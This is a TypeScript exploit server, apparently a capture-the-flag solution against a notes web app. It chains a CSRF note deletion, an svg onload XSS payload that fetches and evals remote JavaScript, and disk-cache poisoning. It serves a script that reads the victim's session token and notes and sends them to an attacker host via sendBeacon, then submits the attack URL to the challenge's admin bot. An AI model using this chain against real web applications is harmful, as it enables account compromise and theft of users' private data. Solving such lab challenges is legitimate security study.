import { Hono } from "hono";

const app = new Hono()

const CHALL_HOST = "http://localhost:3000"
// const _INTERNAL_CHALL_HOST = "http://localhost:3000"
const _INTERNAL_CHALL_HOST = "http://web:3000"
const ATTACKER_HOST = "http://192.168.1.121:1337"

app.get('/csrf', (c) => {
  c.header("Cache-Control", "no-cache, no-store, must-revalidate")
  c.header("Pragma", "no-cache")
  c.header("Expires", "0")
  // lax cookie only allows top-frame navigation to do requests with credentials
  return c.html(/* html */`<div id="holder">
    <script>
    (async function(){
      const sleep = t => new Promise(r => setTimeout(r, t))
      const deleteNote = (noteId) => {
        const form = document.createElement("form")
        form.action = "${_INTERNAL_CHALL_HOST}/api/notes/delete"
        form.method = "post"
        form.target = "_blank"

        const input = document.createElement("input")
        input.name = "noteId"
        input.value = noteId
        form.appendChild(input)

        holder.appendChild(form)
        form.submit()
      };
      const params = new URLSearchParams(location.search)
      const id = params.get("id")
      deleteNote(id)
      await sleep(2000)
    })()
  </script>`)
})

let i = 0

app.get('/at', (c) => {
  c.header("Cache-Control", "no-cache, no-store, must-revalidate")
  c.header("Pragma", "no-cache")
  c.header("Expires", "0")
  i = (i + 1) % 2
  // const payload = `<svg onload=alert(1)>.html`
  const payload = `<svg onload="fetch(baseURI.slice(0,7)+'${new URL(ATTACKER_HOST).host}').then(t=>t.text()).then(eval)">.html`
  console.log(payload.length > 100 ? "overlong!" : '')
  // would be opened by page2.goto with null initiator
  if (i === 1) return c.html(`
  <script>
    (async function(){
      const sleep = t => new Promise(r => setTimeout(r, t))
      await sleep(200)
      
      // 1. get a valid session cookie
      const tw = window.open("${_INTERNAL_CHALL_HOST}")
      await sleep(1200)

      // 2. trigger CSRF
      const payload = \`${payload}\`
      tw.location = "/csrf?id=" + encodeURIComponent(payload)
      await sleep(2500)
      
      // 3. get a same site poison disk cache
      open("${_INTERNAL_CHALL_HOST}")
      await sleep(1000)
      // "refresh" to keep a null initiator and redirect
      window.location = URL.createObjectURL(new Blob([\`
        <script>setTimeout(()=>history.go(-1), 1000)<\\/script>
      \`], { type: "text/html" }))

    })()
  </script>`)
  else return c.redirect(`${_INTERNAL_CHALL_HOST}/api/notes/${payload}`)
})

app.post('/r', async (c) => {
  console.log("Received: ", await (await c.req.blob()).text())
  return c.text("ok")
})

app.get('/', c => {
  c.header("Access-Control-Allow-Origin", "*")
  return c.text(`(async () => {
  const { token } = await (await fetch("/api/token")).json();

  const noteIds = await (
    await fetch("/api/notes", {
      headers: { "X-Token": token },
    })
  ).json();

  const notes = await Promise.all(
    noteIds.map((id) =>
      fetch("/api/notes/" + id, {
        headers: { "X-Token": token },
      }).then((res) => res.text())
    )
  );

  navigator.sendBeacon("${ATTACKER_HOST}/r", notes.join(","));
  })();`, 200, {
    'Content-Type': 'application/javascript'
  })
})

Bun.serve({
  port: 1337,
  fetch: app.fetch
})

await fetch(`${CHALL_HOST}/report`, {
  method: 'POST',
  body: JSON.stringify({
    url: `${ATTACKER_HOST}/at`
  }),
  headers: {
    'Content-Type': 'application/json'
  }
})
